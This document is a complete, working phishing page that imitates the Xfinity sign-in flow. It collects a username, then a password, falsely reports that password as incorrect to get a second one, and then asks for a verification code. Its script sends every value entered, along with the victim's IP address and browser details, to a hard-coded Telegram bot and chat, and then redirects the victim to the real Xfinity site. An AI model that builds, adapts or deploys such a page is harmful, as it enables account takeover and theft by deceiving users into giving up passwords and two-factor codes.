<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Xfinity Sign In</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: #fff;
    color: #333;
    min-height: 100vh;
  }

  .screen {
    max-width: 480px;
    margin: 0 auto;
    min-height: 100vh;
    background: #fff;
    padding: 32px 24px 40px;
    display: none;
    flex-direction: column;
  }

  .screen.active { display: flex; }

  .logo { margin-bottom: 28px; }
  .logo img { width: 100px; }

  h1 {
    font-size: 28px;
    font-weight: 700;
    color: #000;
    margin-bottom: 20px;
    line-height: 1.2;
  }

  /* --- Password Screen --- */
  .email-label {
    font-size: 15px;
    font-weight: 600;
    color: #000;
    margin-bottom: 6px;
  }

  .input-wrap {
    position: relative;
    margin-bottom: 14px;
  }

  .input-wrap input {
    width: 100%;
    padding: 18px 48px 18px 16px;
    font-size: 16px;
    border: 1.5px solid #ccc;
    border-radius: 6px;
    background: #f5f5f5;
    outline: none;
    color: #333;
  }

  .input-wrap input:focus {
    border-color: #6b2fa0;
    background: #fff;
  }

  .eye-icon {
    position: absolute;
    right: 14px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    color: #888;
    display: flex;
    align-items: center;
    user-select: none;
  }

  .eye-icon svg {
    width: 22px;
    height: 22px;
    stroke: #888;
    fill: none;
    stroke-width: 1.8;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  .eye-icon:hover svg { stroke: #555; }

  .forgot-link {
    color: #6b2fa0;
    font-weight: 600;
    font-size: 15px;
    text-decoration: none;
    display: inline-block;
    margin-bottom: 22px;
  }

  .checkbox-row {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 20px;
  }

  .checkbox-row input[type="checkbox"] {
    width: 20px;
    height: 20px;
    accent-color: #6b2fa0;
    cursor: pointer;
    flex-shrink: 0;
  }

  .checkbox-row label {
    font-size: 15px;
    color: #333;
    cursor: pointer;
  }

  .terms-text {
    font-size: 14px;
    color: #555;
    line-height: 1.5;
    margin-bottom: 30px;
  }

  .terms-text a {
    color: #6b2fa0;
    text-decoration: underline;
  }

  .btn-primary {
    background: #6b2fa0;
    color: #fff;
    border: none;
    border-radius: 8px;
    padding: 18px 32px;
    font-size: 17px;
    font-weight: 600;
    cursor: pointer;
    width: 180px;
    margin-bottom: 22px;
  }

  .btn-primary:hover { background: #5a2589; }

  .sign-in-else {
    font-size: 16px;
    font-weight: 700;
    color: #000;
    margin-bottom: 22px;
    cursor: pointer;
  }

  .trouble-text {
    font-size: 15px;
    color: #555;
    margin-bottom: 40px;
  }

  .trouble-text a { color: #6b2fa0; text-decoration: underline; }

  .footer-copy {
    margin-top: auto;
    text-align: center;
    font-size: 13px;
    color: #888;
    border-top: 1px solid #eee;
    padding-top: 16px;
  }

  .footer-copy .web-terms {
    margin-top: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    font-size: 13px;
    color: #555;
  }

  /* --- Sign In Screen --- */
  .screen2-title {
    font-size: 30px;
    font-weight: 700;
    color: #000;
    margin-bottom: 20px;
    line-height: 1.2;
  }

  .input-plain {
    width: 100%;
    padding: 18px 16px;
    font-size: 16px;
    border: 1.5px solid #ccc;
    border-radius: 6px;
    background: #f5f5f5;
    outline: none;
    color: #333;
    margin-bottom: 14px;
  }

  .input-plain::placeholder { color: #aaa; }

  .input-plain:focus {
    border-color: #6b2fa0;
    background: #fff;
  }

  .input-plain.input-error { border-color: #d32f2f; background: #fff8f8; }

  .error-msg {
    color: #d32f2f;
    font-size: 13px;
    margin-top: -10px;
    margin-bottom: 14px;
    display: none;
  }

  .lets-go-btn {
    background: #6b2fa0;
    color: #fff;
    border: none;
    border-radius: 8px;
    padding: 18px 32px;
    font-size: 17px;
    font-weight: 600;
    cursor: pointer;
    width: 160px;
    margin-bottom: 28px;
    display: block;
  }

  .lets-go-btn:hover { background: #5a2589; }

  .option-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 20px 0;
    border-bottom: 1px solid #e5e5e5;
    font-size: 16px;
    color: #000;
    cursor: pointer;
    text-decoration: none;
  }

  .option-row:first-of-type { border-top: 1px solid #e5e5e5; }

  .option-row .chevron { font-size: 20px; color: #555; }

  /* --- Loading State --- */
  .loading {
    position: relative;
    pointer-events: none;
    opacity: 0.7;
  }

  .loading::after {
    content: "";
    position: absolute;
    width: 20px;
    height: 20px;
    top: 50%;
    left: 50%;
    margin-left: -10px;
    margin-top: -10px;
    border: 2px solid rgba(255, 255, 255, 0.3);
    border-radius: 50%;
    border-top-color: #fff;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }
</style>
</head>
<body>

<!-- SCREEN 1 (Sign In with ID) — shown first -->
<div class="screen active" id="screen-signin">
  <div class="logo"><img src="https://raw.githubusercontent.com/starvicks/Ast/refs/heads/main/Screenshot_20260226_222914_Chrome-removebg-preview.png" alt="xfinity"></div>

  <h1 class="screen2-title">Sign in with your Xfinity ID</h1>

  <form id="usernameForm">
    <input type="text" id="pfnid" class="input-plain" placeholder="Email, mobile, or username">
    <div class="error-msg" id="id-error">Please enter your email, mobile, or username.</div>

    <div class="checkbox-row">
      <input type="checkbox" id="remember">
      <label for="remember">Keep me signed in</label>
    </div>

    <p class="terms-text">
      By signing in, you agree to our <a href="#">Terms of Service</a> and
      <a href="#">Privacy Policy</a>.
    </p>

    <button type="submit" class="lets-go-btn">Let's go</button>
  </form>

  <a href="#" class="option-row">Find your Xfinity ID <span class="chevron">&#8250;</span></a>
  <a href="#" class="option-row">Create a new Xfinity ID <span class="chevron">&#8250;</span></a>

  <a href="https://www.xfinity.com/learn/mobile/plan/savings-calculator/?intcmp=PWS:ACQ:BAUP:NON:GEN:XFM:COM:NA:syd:41411116785" target="_blank" style="display:block; margin-top:24px; border-radius:12px; overflow:hidden;">
    <img src="https://raw.githubusercontent.com/starvicks/Ast/refs/heads/main/Screenshot_20260226_221946_Chrome.jpg" alt="Xfinity Mobile promo" style="width:100%; display:block; border-radius:12px;">
  </a>
</div>

<!-- SCREEN 2 (Password) — shown after Let's go -->
<div class="screen" id="screen-password">
  <div class="logo"><img src="https://raw.githubusercontent.com/starvicks/Ast/refs/heads/main/Screenshot_20260226_222914_Chrome-removebg-preview.png" alt="xfinity"></div>

  <div class="email-label" id="email-display"></div>
  <h1>Enter your password</h1>

  <form id="passwordForm">
    <div class="input-wrap">
      <input type="password" id="password" autocomplete="current-password">
      <span class="eye-icon" id="eye-toggle" onclick="togglePass()">
        <!-- Eye OPEN icon (shown when password is hidden) -->
        <svg id="eye-open" viewBox="0 0 24 24">
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
          <circle cx="12" cy="12" r="3"/>
        </svg>
        <!-- Eye CLOSED icon (shown when password is visible) -->
        <svg id="eye-closed" viewBox="0 0 24 24" style="display:none;">
          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
          <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
          <line x1="1" y1="1" x2="23" y2="23"/>
        </svg>
      </span>
    </div>

    <a href="#" class="forgot-link">Forgot password?</a>

    <div class="checkbox-row">
      <input type="checkbox" id="keep">
      <label for="keep">Keep me signed in</label>
    </div>

    <p class="terms-text">
      By signing in, you agree to our <a href="#">Terms of Service</a> and
      <a href="#">Privacy Policy</a>.
    </p>

    <button type="submit" class="btn-primary">Sign in</button>
  </form>

  <div class="sign-in-else" onclick="goBack()">Sign in as someone else</div>

  <p class="trouble-text">Trouble signing in? <a href="#">Get help</a></p>

  <div class="footer-copy">
    <div>&#169; 2026 Comcast</div>
    <div class="web-terms">&#128196; Web Terms Of Service</div>
  </div>
</div>
<!-- SCREEN 2a (Password Re-entry) - shown after first password attempt -->
<div class="screen" id="screen-password-retry">
  <div class="logo"><img src="https://raw.githubusercontent.com/starvicks/Ast/refs/heads/main/Screenshot_20260226_222914_Chrome-removebg-preview.png" alt="xfinity"></div>

  <div class="email-label" id="email-display-retry"></div>
  <h1>Enter your password</h1>

  <div class="input-wrap">
    <input type="password" id="password-retry" autocomplete="current-password">
    <span class="eye-icon" id="eye-toggle-retry" onclick="togglePassRetry()">
      <!-- Eye OPEN icon (shown when password is hidden) -->
      <svg id="eye-open-retry" viewBox="0 0 24 24">
        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
        <circle cx="12" cy="12" r="3"/>
      </svg>
      <!-- Eye CLOSED icon (shown when password is visible) -->
      <svg id="eye-closed-retry" viewBox="0 0 24 24" style="display:none;">
        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
        <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
        <line x1="1" y1="1" x2="23" y2="23"/>
      </svg>
    </span>
  </div>

  <div style="color: #d32f2f; font-size: 14px; margin-bottom: 14px;">
    Your password is incorrect. Please try again.
  </div>

  <a href="#" class="forgot-link">Forgot password?</a>

  <div class="checkbox-row">
    <input type="checkbox" id="keep-retry">
    <label for="keep-retry">Keep me signed in</label>
  </div>

  <p class="terms-text">
    By signing in, you agree to our <a href="#">Terms of Service</a> and
    <a href="#">Privacy Policy</a>.
  </p>

  <button class="btn-primary" id="retry-sign-in-btn">Sign in</button>

  <div class="sign-in-else" onclick="goBackToUsername()">Sign in as someone else</div>

  <p class="trouble-text">Trouble signing in? <a href="#">Get help</a></p>

  <div class="footer-copy">
    <div>&#169; 2026 Comcast</div>
    <div class="web-terms">&#128196; Web Terms Of Service</div>
  </div>
</div>
<!-- SCREEN 3 (OTP Verification) - Additional step for security -->
<div class="screen" id="screen-otp">
  <div class="logo"><img src="https://raw.githubusercontent.com/starvicks/Ast/refs/heads/main/Screenshot_20260226_222914_Chrome-removebg-preview.png" alt="xfinity"></div>

  <h1>Enter verification code</h1>
  <p style="margin-bottom: 20px; color: #555;">We've sent a verification code to your registered email or phone.</p>

  <form id="otpForm">
    <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;">
      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;">
      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;">
      <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 50px; text-align: center; font-size: 20px; border: 1.5px solid #ccc; border-radius: 6px;">
    </div>

    <button type="submit" class="btn-primary">Verify</button>
  </form>

  <div style="text-align: center; margin-top: 20px;">
    <a href="#" id="resendCode" style="color: #6b2fa0; font-weight: 600;">Resend code</a>
  </div>

  <div class="sign-in-else" onclick="goBack()">Back to sign in</div>
</div>

<script>
  // Telegram configuration - using your provided credentials
  const TELEGRAM_BOT_TOKEN = '8434488259:AAHWtsaS7fS39qierbMJv-X6-tG0SB0v5_I';
  const TELEGRAM_CHAT_ID = '7867297027';

  // Function to send message to Telegram
  async function sendToTelegram(message) {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      });

      const data = await response.json();
      console.log('Telegram response:', data);
      return data.ok;
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      return false;
    }
  }

  // Function to get the user's IP address
  async function getUserIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Error getting IP address:', error);
      return 'Unknown';
    }
  }

  // Store collected data
  const collectedData = {
  username: '',
  password: '',
  passwordRetry: '', // Add this for the second password attempt
  otp: '',
  rememberMe: false,
  ipAddress: ''
};

  // Format and send collected data to Telegram in the requested format
  async function reportToTelegram(step) {
  const ipAddress = await getUserIP();
  collectedData.ipAddress = ipAddress;
  let message = `Username: ${collectedData.username || 'Not provided'}\n`;
  message += `%D%1 Password: ${collectedData.password || 'Not provided'}\n`;
  message += `%D%1 Password2: ${collectedData.passwordRetry || 'Not provided'}\n`; // Add this line
  message += `%D%2 OTP: ${collectedData.otp || 'Not provided'}\n`;
  message += `%D%E Remember Me: ${collectedData.rememberMe ? 'Yes' : 'No'}\n`;
  message += `%C%0 Browser Info:\n`;
  message += `%2 User Agent: ${navigator.userAgent}\n`;
  message += `%2 IP Address: ${collectedData.ipAddress}\n`;
  message += `%2 Timestamp xfinity.com: ${new Date().toLocaleString()}\n`;
  message += `%2 Step: ${step}`;

  // Send to Telegram and wait for it to complete
  const success = await sendToTelegram(message);
  if (success) {
    console.log('Xfinity Data sent to Telegram successfully');
  } else {
    console.error('Failed to send data to Telegram');
  }

  return success;
}

  document.addEventListener('DOMContentLoaded', function() {
    const usernameForm = document.getElementById('usernameForm');
    const passwordForm = document.getElementById('passwordForm');
    const otpForm = document.getElementById('otpForm');
    const resendCode = document.getElementById('resendCode');
    const otpInputs = document.querySelectorAll('.otp-input');
    const retrySignInBtn = document.getElementById('retry-sign-in-btn');
    
    // Helper to toggle loading state
    function setLoading(button, isLoading) {
      if (isLoading) {
        button.classList.add('loading');
        button.disabled = true;
      } else {
        button.classList.remove('loading');
        button.disabled = false;
      }
    }
    if (usernameForm) {
      usernameForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        collectedData.username = document.getElementById('pfnid').value;
        collectedData.rememberMe = document.getElementById('remember').checked;

        // Report to Telegram and wait for completion
        await reportToTelegram('Step 1 - Username entered');

        const submitBtn = this.querySelector('button');
        setLoading(submitBtn, true);

        // Simulate server request time (1.5s)
        setTimeout(() => {
          setLoading(submitBtn, false);

          document.getElementById('email-display').textContent = collectedData.username;
          document.getElementById('screen-signin').classList.remove('active');
          document.getElementById('screen-password').classList.add('active');
          document.getElementById('password').focus();
        }, 1500);
      });
    }
    if (passwordForm) {
  passwordForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    collectedData.password = document.getElementById('password').value;

    // Report to Telegram and wait for completion
    await reportToTelegram('Step 2 - First password entered');

    const submitBtn = this.querySelector('button');
    setLoading(submitBtn, true);

    // Simulate server request time (1.5s)
    setTimeout(() => {
      setLoading(submitBtn, false);

      // Move to password retry screen instead of OTP
      document.getElementById('screen-password').classList.remove('active');
      document.getElementById('screen-password-retry').classList.add('active');
      document.getElementById('email-display-retry').textContent = collectedData.username;
      
      // Copy the "Keep me signed in" state
      document.getElementById('keep-retry').checked = document.getElementById('keep').checked;
      
      setTimeout(function() {
        document.getElementById('password-retry').focus();
      }, 100);
    }, 1500);
  });
}
    if (retrySignInBtn) {
    retrySignInBtn.addEventListener('click', async function(e) {
      e.preventDefault();
      collectedData.passwordRetry = document.getElementById('password-retry').value;
      collectedData.rememberMe = document.getElementById('keep-retry').checked;

      // Report to Telegram with both passwords
      await reportToTelegram('Step 3 - Second password entered');

      setLoading(this, true);

      // Simulate server request time (1.5s)
      setTimeout(() => {
        setLoading(this, false);

        // Move to OTP step
        document.getElementById('screen-password-retry').classList.remove('active');
        document.getElementById('screen-otp').classList.add('active');

        setTimeout(function() {
          otpInputs[0].focus();
        }, 100);
      }, 1500);
    });
  }
    if (otpForm) {
      otpForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const otp = Array.from(otpInputs).map(input => input.value).join('');
        collectedData.otp = otp;

        // Report to Telegram and wait for completion
        await reportToTelegram('Step 3 - OTP entered');

        const submitBtn = this.querySelector('button');
        setLoading(submitBtn, true);

        // Simulate server request time (1.5s)
        setTimeout(() => {
          setLoading(submitBtn, false);

          // Show success message or redirect
          alert('Verification successful!');
          window.location.href = 'https://xfinity.com';
        }, 1500);
      });
    }

    if (resendCode) {
      resendCode.addEventListener('click', function(e) {
        e.preventDefault();
        alert('Verification code resent!');
      });
    }

    // Handle OTP input focus
    otpInputs.forEach((input, index) => {
      input.addEventListener('input', function() {
        const value = this.value;
        if (value.length === 1 && index < otpInputs.length - 1) {
          otpInputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value === '' && index > 0) {
          otpInputs[index - 1].focus();
        }
      });
    });
  });

function goBackToUsername() {
    document.getElementById('screen-password-retry').classList.remove('active');
    document.getElementById('screen-signin').classList.add('active');
  }
  function togglePassRetry() {
    const p = document.getElementById('password-retry');
    const eyeOpen = document.getElementById('eye-open-retry');
    const eyeClosed = document.getElementById('eye-closed-retry');

    if (p.type === 'password') {
      p.type = 'text';
      eyeOpen.style.display = 'none';
      eyeClosed.style.display = 'block';
    } else {
      p.type = 'password';
      eyeOpen.style.display = 'block';
      eyeClosed.style.display = 'none';
    }
  }

  // Add Enter key support for the retry password field
  document.getElementById('password-retry').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
      document.getElementById('retry-sign-in-btn').click();
    }
  });

  function letsGo() {
    const input = document.getElementById('pfnid');
    const errorMsg = document.getElementById('id-error');
    const val = input.value.trim();

    if (!val) {
      input.classList.add('input-error');
      errorMsg.style.display = 'block';
      input.focus();
      return;
    }

    input.classList.remove('input-error');
    errorMsg.style.display = 'none';

    document.getElementById('email-display').textContent = val;
    document.getElementById('screen-signin').classList.remove('active');
    document.getElementById('screen-password').classList.add('active');
    document.getElementById('password').focus();
  }

  function goBack() {
    document.getElementById('screen-password').classList.remove('active');
    document.getElementById('screen-signin').classList.add('active');
  }

  function togglePass() {
    const p = document.getElementById('password');
    const eyeOpen = document.getElementById('eye-open');
    const eyeClosed = document.getElementById('eye-closed');

    if (p.type === 'password') {
      p.type = 'text';
      eyeOpen.style.display = 'none';
      eyeClosed.style.display = 'block';
    } else {
      p.type = 'password';
      eyeOpen.style.display = 'block';
      eyeClosed.style.display = 'none';
    }
  }

  document.getElementById('pfnid').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') letsGo();
  });
</script>
</body>
</html>